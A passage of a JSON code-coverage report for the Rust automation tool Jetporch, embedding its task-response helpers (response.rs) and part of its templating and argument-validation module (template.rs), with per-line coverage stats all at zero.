"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":258,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":267,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[],"length":0,"stats":{"Line":0}},{"line":289,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":296,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":303,"address":[],"length":0,"stats":{"Line":0}},{"line":304,"address":[],"length":0,"stats":{"Line":0}},{"line":307,"address":[],"length":0,"stats":{"Line":0}},{"line":308,"address":[],"length":0,"stats":{"Line":0}},{"line":309,"address":[],"length":0,"stats":{"Line":0}},{"line":310,"address":[],"length":0,"stats":{"Line":0}},{"line":311,"address":[],"length":0,"stats":{"Line":0}},{"line":313,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":320,"address":[],"length":0,"stats":{"Line":0}},{"line":321,"address":[],"length":0,"stats":{"Line":0}},{"line":323,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":327,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":331,"address":[],"length":0,"stats":{"Line":0}},{"line":332,"address":[],"length":0,"stats":{"Line":0}},{"line":333,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":342,"address":[],"length":0,"stats":{"Line":0}},{"line":345,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":351,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":355,"address":[],"length":0,"stats":{"Line":0}},{"line":356,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":360,"address":[],"length":0,"stats":{"Line":0}},{"line":361,"address":[],"length":0,"stats":{"Line":0}},{"line":362,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":366,"address":[],"length":0,"stats":{"Line":0}},{"line":367,"address":[],"length":0,"stats":{"Line":0}},{"line":372,"address":[],"length":0,"stats":{"Line":0}},{"line":374,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":376,"address":[],"length":0,"stats":{"Line":0}},{"line":378,"address":[],"length":0,"stats":{"Line":0}},{"line":380,"address":[],"length":0,"stats":{"Line":0}},{"line":381,"address":[],"length":0,"stats":{"Line":0}},{"line":384,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":389,"address":[],"length":0,"stats":{"Line":0}},{"line":392,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[],"length":0,"stats":{"Line":0}},{"line":403,"address":[],"length":0,"stats":{"Line":0}},{"line":405,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":407,"address":[],"length":0,"stats":{"Line":0}},{"line":410,"address":[],"length":0,"stats":{"Line":0}},{"line":411,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":418,"address":[],"length":0,"stats":{"Line":0}},{"line":419,"address":[],"length":0,"stats":{"Line":0}},{"line":420,"address":[],"length":0,"stats":{"Line":0}},{"line":421,"address":[],"length":0,"stats":{"Line":0}},{"line":423,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}},{"line":426,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":429,"address":[],"length":0,"stats":{"Line":0}},{"line":431,"address":[],"length":0,"stats":{"Line":0}},{"line":432,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":452,"address":[],"length":0,"stats":{"Line":0}},{"line":454,"address":[],"length":0,"stats":{"Line":0}},{"line":456,"address":[],"length":0,"stats":{"Line":0}},{"line":457,"address":[],"length":0,"stats":{"Line":0}},{"line":459,"address":[],"length":0,"stats":{"Line":0}},{"line":460,"address":[],"length":0,"stats":{"Line":0}},{"line":464,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":473,"address":[],"length":0,"stats":{"Line":0}},{"line":476,"address":[],"length":0,"stats":{"Line":0}},{"line":481,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":211},{"path":["/","Users","wings","projects","jetpack","src","handle","response.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::Arc;\nuse crate::tasks::request::{TaskRequest, TaskRequestType};\nuse crate::tasks::response::{TaskStatus, TaskResponse};\nuse crate::inventory::hosts::Host;\nuse crate::playbooks::traversal::RunState;\nuse crate::tasks::fields::Field;\nuse crate::connection::command::CommandResult;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::playbooks::visitor::PlaybookVisitor;\nuse std::sync::RwLock;\n\n// response mostly contains shortcuts for returning objects that are appropriate for module returns\n// and also errors, in various instances.  Using response ensures the errors are (mostly) constructed\n// correctly and the code is easier to change than if every module constructed returns\n// manually. So use the response functions!\n\npub struct Response {\n    run_state: Arc\u003cRunState\u003e, \n    host: Arc\u003cRwLock\u003cHost\u003e\u003e, \n}\n\nimpl Response {\n\n    pub fn new(run_state_handle: Arc\u003cRunState\u003e, host_handle: Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Self {\n        Self {\n            run_state: run_state_handle,\n            host: host_handle,\n        }\n    }\n\n    pub fn get_context(\u0026self) -\u003e Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e {\n        return Arc::clone(\u0026self.run_state.context);\n    }\n\n    pub fn get_visitor(\u0026self) -\u003e Arc\u003cRwLock\u003cPlaybookVisitor\u003e\u003e {\n        return Arc::clone(\u0026self.run_state.visitor);\n    }\n\n    pub fn is_failed(\u0026self, _request: \u0026Arc\u003cTaskRequest\u003e,  msg: \u0026String) -\u003e Arc\u003cTaskResponse\u003e {\n        return Arc::new(TaskResponse { \n            status: TaskStatus::Failed, \n            changes: Vec::new(), \n            msg: Some(msg.clone()), \n            command_result: Arc::new(None), \n            with: Arc::new(None), \n            and: Arc::new(None)\n        });\n    }\n\n    pub fn not_supported(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // modules should return this on any request legs they don't support... though they should also never\n        // be called against those legs if the Query leg is written correctly!\n        return self.is_failed(request, \u0026String::from(\"not supported\"));\n    }\n\n    pub fn command_failed(\u0026self, _request: \u0026Arc\u003cTaskRequest\u003e, result: \u0026Arc\u003cOption\u003cCommandResult\u003e\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // used internally by run functions in remote.rs when commands fail, suitable for use as a final module response\n        self.get_visitor().read().expect(\"read visitor\").on_command_failed(\u0026self.get_context(), \u0026Arc::clone(\u0026self.host), \u0026Arc::clone(result));\n        return Arc::new(TaskResponse {\n            status: TaskStatus::Failed,\n            changes: Vec::new(), \n            msg: Some(String::from(\"command failed\")), \n            command_result: Arc::clone(\u0026result), \n            with: Arc::new(None), \n            and: Arc::new(None)\n        });\n    }\n\n    pub fn command_ok(\u0026self, _request: \u0026Arc\u003cTaskRequest\u003e, result: \u0026Arc\u003cOption\u003cCommandResult\u003e\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // used internally by run functions in remote.rs when commands succeed, suitable for use as a final module response\n        self.get_visitor().read().expect(\"read visitor\").on_command_ok(\u0026self.get_context(), \u0026Arc::clone(\u0026self.host), \u0026Arc::clone(result));\n        return Arc::new(TaskResponse {\n            status: TaskStatus::IsExecuted,\n            changes: Vec::new(), msg: None, command_result: Arc::clone(\u0026result), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn is_skipped(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // returned by playbook traversal code when skipping over a task due to a condition not being met or other factors\n        assert!(request.request_type == TaskRequestType::Validate, \"is_skipped response can only be returned for a validation request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsSkipped, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn is_matched(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, ) -\u003e Arc\u003cTaskResponse\u003e {\n        // returned by a query function when the resource is matched exactly and no operations are neccessary to \n        // run to configure the remote\n        assert!(request.request_type == TaskRequestType::Query || request.request_type == TaskRequestType::Validate,  \n            \"is_matched response can only be returned for a query request, was {:?}\", request.request_type);\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsMatched, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn is_created(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // the only successful result to return from a Create leg.\n        assert!(request.request_type == TaskRequestType::Create, \"is_executed response can only be returned for a creation request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsCreated, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n    \n    // see also command_ok for shortcuts, as used in the shell module.\n    pub fn is_executed(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // a valid response from an execute leg that is not command based or runs multiple commands\n        assert!(request.request_type == TaskRequestType::Execute, \"is_executed response can only be returned for a creation request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsExecuted, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n    \n    pub fn is_removed(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // the only appropriate response from a removal request\n        assert!(request.request_type == TaskRequestType::Remove, \"is_removed response can only be returned for a remove request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsRemoved, \n            changes: Vec::new(), \n            msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn is_passive(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // the only appropriate response from a passive module, for example, echo\n        assert!(request.request_type == TaskRequestType::Passive || request.request_type == TaskRequestType::Execute, \"is_passive response can only be returned for a passive or execute request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsPassive, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n    \n    pub fn is_modified(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, changes: Vec\u003cField\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // the only appropriate response from a modification leg, note that changes must be passed in and should come from fields.rs\n        assert!(request.request_type == TaskRequestType::Modify, \"is_modified response can only be returned for a modification request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::IsModified, \n            changes: changes, \n            msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn needs_creation(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // a response from a query function that requests invocation of the create leg.\n        assert!(request.request_type == TaskRequestType::Query, \"needs_creation response can only be returned for a query request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::NeedsCreation, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None), \n        });\n    }\n    \n    pub fn needs_modification(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, changes: \u0026Vec\u003cField\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // a response from a query function that requests invocation of the modify leg.\n        assert!(request.request_type == TaskRequestType::Query, \"needs_modification response can only be returned for a query request\");\n        assert!(!changes.is_empty(), \"changes must not be empty\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::NeedsModification, \n            changes: changes.clone(), \n            msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None) \n        });\n    }\n    \n    pub fn needs_removal(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // a response from a query function that requests invocation of the removal leg.\n        assert!(request.request_type == TaskRequestType::Query, \"needs_removal response can only be returned for a query request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::NeedsRemoval, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n    pub fn needs_execution(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // a response from a query function that requests invocation of the execute leg.\n        // modules that use 'execute' should generally not have legs for creation, removal, or modification\n        assert!(request.request_type == TaskRequestType::Query, \"needs_execution response can only be returned for a query request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::NeedsExecution, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None),and: Arc::new(None)\n        });\n    }\n    \n    pub fn needs_passive(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Arc\u003cTaskResponse\u003e {\n        // this is the response that passive modules use to exit the query leg\n        assert!(request.request_type == TaskRequestType::Query, \"needs_passive response can only be returned for a query request\");\n        return Arc::new(TaskResponse { \n            status: TaskStatus::NeedsPassive, \n            changes: Vec::new(), msg: None, command_result: Arc::new(None), with: Arc::new(None), and: Arc::new(None)\n        });\n    }\n\n}","traces":[{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":94},{"path":["/","Users","wings","projects","jetpack","src","handle","template.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::{Arc,RwLock};\nuse std::path::PathBuf;\nuse crate::tasks::request::TaskRequest;\nuse crate::tasks::response::TaskResponse;\nuse crate::inventory::hosts::Host;\nuse crate::playbooks::traversal::RunState;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::tasks::cmd_library::{screen_path,screen_general_input_strict};\nuse crate::handle::response::Response;\nuse crate::playbooks::templar::{Templar,TemplateMode};\n\n// template contains support code for all variable evaluation in the playbook language, as well as\n// support for the template module, and ALSO the code to validate and process module arguments to make\n// sure they are the right type.\n//\n// because module arguments come in as strings, we evaluate templates here and then see if they can\n// be parsed as their desired types.\n\n// when blend target must be specified, it is either the template module or *not*.\n// the only real difference (at the moment) is that the template module is allowed access\n// to environment variables which are prefixed as ENV_foo. The environment mechanism is how\n// we work with secret manager tools. See the website secrets documentation for details\n\n#[derive(Eq,Hash,PartialEq,Clone,Copy,Debug)]\npub enum BlendTarget {\n    NotTemplateModule,\n    TemplateModule,\n}\n\n// where used, safe means screening commands or arguments for unexpected shell characters\n// that could lead to command escapes. Because a command is marked unsafe does not mean\n// it is actually unsafe, it just means that it is not checked. A command using\n// variables from untrusted sources may actually be unsafe, for instance, the shell\n// module when used with 'unsafe: true'.  Though if no variables are used, it would\n// be quite safe.\n\n#[derive(Eq,Hash,PartialEq,Clone,Copy,Debug)]\npub enum Safety {\n    Safe,\n    Unsafe\n}\n\npub struct Template {\n    run_state: Arc\u003cRunState\u003e, \n    host: Arc\u003cRwLock\u003cHost\u003e\u003e, \n    response: Arc\u003cResponse\u003e,\n    detached_templar: Templar\n}\n\nimpl Template {\n\n    // templating is always done in reference to a specific host, so that we can mix in host specific variables\n    // the response is in the constructor as need it to return errors that are passed upwards from\n    // functions below.\n\n    pub fn new(run_state: Arc\u003cRunState\u003e, host: Arc\u003cRwLock\u003cHost\u003e\u003e, response:Arc\u003cResponse\u003e) -\u003e Self {\n        Self {\n            run_state,\n            host,\n            response,\n            detached_templar: Templar::new()\n        }\n    }\n\n    pub fn get_context(\u0026self) -\u003e Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e {\n        return Arc::clone(\u0026self.run_state.context);\n    }\n\n    fn unwrap_string_result(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, str_result: \u0026Result\u003cString,String\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        return match str_result {\n            Ok(x) =\u003e Ok(x.clone()),\n            Err(y) =\u003e {\n                return Err(self.response.is_failed(request, \u0026y.clone()));\n            }\n        };\n    }\n\n    fn template_unsafe_internal(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, _field: \u0026String, template: \u0026String, blend_target: BlendTarget) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        let result = self.run_state.context.read().unwrap().render_template(template, \u0026self.host, blend_target, tm);\n        if result.is_ok() {\n            let result_ok = result.as_ref().unwrap();\n            if result_ok.eq(\"\") {\n                return Err(self.response.is_failed(request, \u0026format!(\"evaluated to empty string\")));\n            }\n        }\n        let result2 = self.unwrap_string_result(request, \u0026result)?;\n        return Ok(result2);\n    }\n    \n    pub fn string_for_template_module_use_only(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // this is the version of templating that gives access to secret variables, we don't allow them elsewhere as they would be easy to leak to CI/CD/build output/logs\n        // and the contents to templates are not shown to anything\n        return self.template_unsafe_internal(request, tm, field, template, BlendTarget::TemplateModule);\n    }\n\n    pub fn string_unsafe_for_shell(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // indicates templating a string that will not without further processing, be passed to a shell command\n        return self.template_unsafe_internal(request, tm, field, template, BlendTarget::NotTemplateModule);\n    }\n\n\n    // FIXME: this code is possibly a bit redundant - perhaps calling methods can use the public function and this can be eliminated\n\n    fn string_option_unsafe(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode,field: \u0026String, template: \u0026Option\u003cString\u003e) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // templates a string that is not allowed to be used in shell commands and may contain special characters\n        if template.is_none() { return Ok(None); }\n        let result = self.string(request, tm, field, \u0026template.as_ref().unwrap());\n        return match result { \n            Ok(x) =\u003e Ok(Some(x)), \n            Err(y) =\u003e { Err(self.response.is_failed(request, \u0026format!(\"field ({}) template error: {:?}\", field, y))) } \n        };\n    }\n    \n    pub fn string_option_unsafe_for_shell(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // indicates templating a string that will not without further processing, be passed to a shell command\n        return match template.is_none() {\n            true =\u003e Ok(None),\n            false =\u003e Ok(Some(self.template_unsafe_internal(request, tm, field, \u0026template.as_ref().unwrap(), BlendTarget::NotTemplateModule)?))\n        }\n    }\n\n    pub fn string(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // templates a required string parameter - the simplest of argument processing, this requires no casting to other types\n        let result = self.string_unsafe_for_shell(request, tm, field, template);\n        return match result {\n            Ok(x) =\u003e match screen_general_input_strict(\u0026x) {\n                Ok(y) =\u003e Ok(y),\n                Err(z) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"field {}, {}\", field, z))) }\n            },\n            Err(y) =\u003e Err(y)\n        };\n    }\n\n    pub fn string_no_spaces(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // same as self.string above, this version also does not allow spaces in the resulting string\n        let value = self.string(request, tm, field, template)?;\n        if self.has_spaces(\u0026value) {\n            return Err(self.response.is_failed(request, \u0026format!(\"field ({}): spaces are not allowed\", field)))\n        }\n        return Ok(value.clone());\n    }\n\n    pub fn string_option_no_spaces(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // this is a version of string_no_spaces that allows the value to be optional\n        let prelim = self.string_option(request, tm, field, template)?;\n        if prelim.is_some() {\n            let value = prelim.as_ref().unwrap();\n            if self.has_spaces(\u0026value) {\n                return Err(self.response.is_failed(request, \u0026format!(\"field ({}): spaces are not allowed\", field)))\n            }\n        }\n        return Ok(prelim.clone());\n    }\n\n    pub fn string_option_default(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e, default: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // this is a version of string_no_spaces that allows the value to be optional\n        let prelim = self.string_option(request, tm, field, template)?;\n        match prelim {\n            Some(x) =\u003e Ok(x.clone()),\n            None =\u003e Ok(default.clone())\n        }\n    }\n\n    pub fn string_option_trim(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e) -\u003e 